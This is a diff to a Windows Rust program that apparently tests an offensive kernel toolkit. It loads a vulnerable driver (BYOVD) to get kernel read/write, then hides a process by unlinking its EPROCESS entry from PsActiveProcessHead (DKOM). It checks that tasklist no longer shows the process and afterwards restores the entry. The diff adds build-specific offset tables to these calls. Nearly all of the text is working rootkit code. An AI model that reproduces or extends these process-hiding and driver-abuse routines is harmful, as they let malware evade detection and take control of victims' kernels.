@@ -18,7 +18,7 @@
 
 #![cfg(target_os = "windows")]
 
-use nyx_operator_kernelsdk::offsets::eprocess;
+use nyx_operator_kernelsdk::offsets::{eprocess, EprocessOffsets, for_build};
 use nyx_operator_kernelsdk::persistence::ProcessHider;
 use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
 use nyx_operator_kernelsdk::KernelRw;
@@ -106,6 +106,8 @@ fn main() {
         }
     };
     let base = unsafe { kernel_base::ntoskrnl_base() }.unwrap();
+    let ebuild = for_build(17763).expect("unsupported build");
+    let offsets = ebuild.offsets;
     let head_kva = base + PS_ACTIVE_PROCESS_HEAD_RVA as usize;
     println!("[J.2] PsActiveProcessHead KVA = 0x{:016x}", head_kva);
 
@@ -115,7 +117,7 @@ fn main() {
 
     // ---- find EPROCESS ----
     println!("[J.4] ProcessHider::find_eprocess(pid={}) ...", pid);
-    let eproc = match ProcessHider::find_eprocess(&krw, head_kva, pid) {
+    let eproc = match ProcessHider::find_eprocess(&krw, head_kva, pid, &offsets) {
         Ok(e) => e,
         Err(e) => { eprintln!("[FAIL] find_eprocess: {}", e); loaded.unload(); std::process::exit(2); }
     };
@@ -128,7 +130,7 @@ fn main() {
 
     // ---- unlink (DKOM 窗口开始) ----
     println!("[J.5] ProcessHider::unlink (DKOM — PG window opens) ...");
-    if let Err(e) = ProcessHider::unlink(&krw, eproc) {
+    if let Err(e) = ProcessHider::unlink(&krw, eproc, &offsets) {
         eprintln!("[FAIL] unlink: {}", e); loaded.unload(); std::process::exit(3);
     }
     println!("[OK] unlinked");
@@ -149,7 +151,7 @@ fn main() {
     println!("[J.8] tasklist notepad count (post-restore) = {}", restored);
 
     // ---- find_eprocess 再确认（恢复后应能再找到）----
-    match ProcessHider::find_eprocess(&krw, head_kva, pid) {
+    match ProcessHider::find_eprocess(&krw, head_kva, pid, &offsets) {
         Ok(e) => println!("[OK] find_eprocess(post-restore) found EPROCESS @ 0x{:016x} — visible again", e),
         Err(e) => println!("[WARN] find_eprocess(post-restore): {} — still hidden from list walk", e),
     }
